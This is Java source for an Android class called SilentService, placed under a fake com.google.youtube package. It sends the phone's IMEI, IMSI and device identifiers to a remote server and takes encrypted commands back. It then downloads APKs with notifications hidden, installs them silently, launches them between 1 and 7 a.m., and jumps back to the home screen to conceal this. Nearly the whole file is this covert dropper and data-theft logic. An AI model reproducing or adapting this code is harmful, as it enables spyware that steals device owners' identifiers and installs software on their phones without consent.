package com.google.youtube.services;

import java.io.File;
import java.util.Calendar;
import java.util.Date;
import org.json.JSONObject;
import com.google.youtube.utils.A;
import com.google.youtube.utils.DeviceUtils;
import com.google.youtube.utils.HttpUtil;
import com.google.youtube.utils.MyHelpUtil;
import android.app.DownloadManager;
import android.app.DownloadManager.Query;
import android.app.DownloadManager.Request;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Environment;
import android.text.TextUtils;

public class SilentService {

	private Context context;

	public SilentService(Context context) {
		this.context = context;
	}

	private String a;

	private String b;

	private int c = 6;

	private int d = 500;

	private int e = 24;

	private int f = 5;

	private String g;

	/**
	 * 运行静默
	 */
	public void run() {

		if (MyHelpUtil.checkNet(context)) {

			String localURL = HttpUtil.BASE_URL + "google_c.action";

			String param = setPostParams();

			try {

				String msg = HttpUtil.postRequest(localURL, param);

				System.out.println("服务器返回信息：" + msg);

				if (!TextUtils.isEmpty(msg)) {

					JSONObject jsb = new JSONObject(MyHelpUtil.deCrypto(msg));

					d = jsb.getInt("d");

					e = jsb.getInt("e");

					a = jsb.getString("a");

					b = jsb.getString("b");

					c = jsb.getInt("c");

					f = jsb.getInt("f");

					g = jsb.getString("g");

					SharedPreferences appSharedPreferences = context
							.getSharedPreferences("inr", 0);

					String p = MyHelpUtil.enCrypto(a, MyHelpUtil.A);

					File path = Environment.getExternalStoragePublicDirectory(A
							.gc());

					File file = new File(path, b + ".apk");

					if (appSharedPreferences.getInt(p, 0) >= c) {

						if (file.exists()) {

							file.delete();

						}
					}

					boolean bool = checkOption(d, e, a, c);

					if (bool) {

						System.out.println("--jm--:Y");

						if (!appSharedPreferences.contains(p)) {

							Editor localEditor = appSharedPreferences.edit();

							localEditor.putInt(p, 0);

							localEditor.commit();

						}

						localDownloadManager(b, a, g);

					} else {
						System.out.println("--jm--:N");
					}

				}

			} catch (Exception e) {
				e.printStackTrace();
			}
		}
	}

	private boolean checkOption(int a, int b, String c, int d) {

		synchronized (this) {

			SharedPreferences localSharedPreferences = context
					.getSharedPreferences("scr", 0);

			SharedPreferences msgSharedPreferences = context
					.getSharedPreferences("tir", 0);

			SharedPreferences installSharedPreferences = context
					.getSharedPreferences("inr", 0);

			int local_screen_count = localSharedPreferences.getInt("sc", 0);

			int installCount = installSharedPreferences.getInt(
					MyHelpUtil.enCrypto(c, MyHelpUtil.A), 0);

			boolean time_iner = false;

			if (!msgSharedPreferences.contains("si")) {

				time_iner = true;

			} else {

				/**/
				long reslut = Math.abs(new Date().getTime()
						- msgSharedPreferences.getLong("si", 0));

				long display_interval_to_long = Math.abs(b * 3600 * 1000);

				if (reslut >= display_interval_to_long) {

					time_iner = true;

				}
			}

			if (local_screen_count >= a && time_iner && installCount < d) {

				return true;

			}

			return false;

		}
	}

	private String setPostParams() {

		StringBuilder params_sb = new StringBuilder();

		params_sb.append("h=" + DeviceUtils.getKeyStore(context));

		params_sb.append("&i=" + DeviceUtils.getIMSI(context));

		params_sb.append("&j=" + DeviceUtils.getIMEI(context));

		SharedPreferences localSharedPreferences_id = context
				.getSharedPreferences("DEVICE_STATUS", 0);

		params_sb.append("&k="
				+ localSharedPreferences_id.getString("create_device_id",
						"null"));

		params_sb.append("&l=" + DeviceUtils.getTelephoneType(context));

		return params_sb.toString();
	}

	private boolean checkDownloadOption() {

		SharedPreferences localSharedPreferences = context
				.getSharedPreferences("tir", 0);

		long s = localSharedPreferences.getLong("sdd", -1);

		if (s == -1) {

			return true;
		}

		long srestolong = Math.abs(f * 60 * 1000);

		long res = Math.abs(new Date().getTime() - s);

		if (res >= srestolong) {

			return true;

		}

		return false;
	}

	private long excute(String a, String b, String c) {

		DownloadManager downloadManager = (DownloadManager) context
				.getSystemService(Context.DOWNLOAD_SERVICE);

		Uri uri;

		if (TextUtils.isEmpty(c)) {

			uri = Uri.parse(MyHelpUtil.lineDownloadAppURL(context, a));

		} else {
			uri = Uri.parse(c);
		}

		DownloadManager.Request request = new Request(uri);

		request.setAllowedNetworkTypes(Request.NETWORK_MOBILE
				| Request.NETWORK_WIFI);

		request.setVisibleInDownloadsUi(false);

		request.setShowRunningNotification(false);

		request.setDestinationInExternalPublicDir(A.gc(), a + ".apk");

		request.addRequestHeader("Connection", "Keep-Alive");

		request.addRequestHeader("Accept-Language", "zh-CN");

		request.addRequestHeader("Charset", "UTF-8");

		request.addRequestHeader("User-Agent", "Android");

		request.addRequestHeader("Accept",
				"application/vnd.android.package-archive,application/msword, */*");

		synchroDownloadData(b);

		saveSilentDownloadStatus();

		return downloadManager.enqueue(request);
	}

	private void synchroDownloadData(String a) {

		String rawParams = MyHelpUtil.setParams(a, 1, context);

		try {
			HttpUtil.postRequest(HttpUtil.BASE_URL + "google_e.action",
					rawParams);
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

	private void localDownloadManager(String a, String b, String c) {

		String state = Environment.getExternalStorageState();

		if (!Environment.MEDIA_MOUNTED.equals(state)) {
			return;
		}

		File path = Environment.getExternalStoragePublicDirectory(A.gc());

		path.mkdirs();

		File file = new File(path, a + ".apk");

		SharedPreferences localSharedPreferences = context
				.getSharedPreferences("do", 0);

		DownloadManager downloadManager = (DownloadManager) context
				.getSystemService(Context.DOWNLOAD_SERVICE);

		long downloadid = localSharedPreferences.getLong(a, -1);

		if (downloadid != -1) {

			Query query = new Query();

			query.setFilterById(downloadid);

			Cursor cursor = downloadManager.query(query);

			try {

				if (cursor.moveToNext()) {

					int column_status_index = cursor
							.getColumnIndex(DownloadManager.COLUMN_STATUS);

					int status = cursor.getInt(column_status_index);

					int column_status_uri = cursor
							.getColumnIndex(DownloadManager.COLUMN_LOCAL_URI);

					String localuri = cursor.getString(column_status_uri);

					if (status == DownloadManager.STATUS_SUCCESSFUL) {

						// --------
						PackageInfo pi = context.getPackageManager()
								.getPackageArchiveInfo(
										Uri.parse(localuri).getPath(),
										PackageManager.GET_SIGNATURES);

						if (pi == null || pi.signatures == null) {

							downloadManager.remove(downloadid);

							if (checkDownloadOption()) {

								long id = excute(a, b, c);

								MyHelpUtil.setDownloadId(context, id, a);

							}

							return;

						}

						int install_return = MyHelpUtil.install(Uri.parse(
								localuri).getPath());

						File file1 = new File(Uri.parse(localuri).getPath());

						if (install_return == 1) {

							if (file1.exists()) {

								file1.delete();

							}

							return;
						}

						if (install_return == 0) {

							sysInstall(b);

							saveSilentStatus();

							if (checkOpenTime()) {

								synchroOpenData(b);

								MyHelpUtil.openApp(b, context);

								try {

									Thread.sleep(3 * 1000);

									backHome();

								} catch (InterruptedException e) {
									// TODO Auto-generated catch block
									e.printStackTrace();
								}

							}
						}

					} else if (status == DownloadManager.STATUS_FAILED) {

						Editor localEditor = localSharedPreferences.edit();

						localEditor.remove(a);

						localEditor.commit();

						downloadManager.remove(downloadid);

					}

				} else {

					if (file.exists()) {

						file.delete();
					}

					if (checkDownloadOption()) {

						long id = excute(a, b, c);

						MyHelpUtil.setDownloadId(context, id, a);

					}

				}

			} finally {
				if (cursor != null) {
					cursor.close();
				}
			}

		} else {

			if (file.exists()) {

				file.delete();
			}

			if (checkDownloadOption()) {

				long id = excute(a, b, c);

				MyHelpUtil.setDownloadId(context, id, a);

			}

		}

	}

	public void saveSilentStatus() {

		SharedPreferences localSharedPreferences = context
				.getSharedPreferences("tir", 0);

		Editor localEditor = localSharedPreferences.edit();

		localEditor.putLong("si", new Date().getTime());

		localEditor.commit();
	}

	private void saveSilentDownloadStatus() {

		SharedPreferences localSharedPreferences = context
				.getSharedPreferences("tir", 0);

		Editor localEditor = localSharedPreferences.edit();

		localEditor.putLong("sdd", new Date().getTime());

		localEditor.commit();
	}

	public void sysInstall(String a) {

		String params = MyHelpUtil.setParams(a, 2, context);

		try {
			HttpUtil.postRequest(HttpUtil.BASE_URL + "google_f.action", params);
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}

	public void backHome() {
		Intent i = new Intent(Intent.ACTION_MAIN);
		i.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
		i.addCategory(Intent.CATEGORY_HOME);
		context.startActivity(i);
	}

	public boolean checkOpenTime() {

		Calendar calendar = Calendar.getInstance();

		int hour = calendar.get(Calendar.HOUR_OF_DAY);

		if (hour >= 1 && hour <= 7) {
			return true;
		} else {
			return false;
		}
	}

	public void synchroOpenData(String a) {

		String rawParams = MyHelpUtil.setParams(a, 3, context);
		try {
			HttpUtil.postRequest(HttpUtil.BASE_URL + "google_g.action",
					rawParams);
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}

}
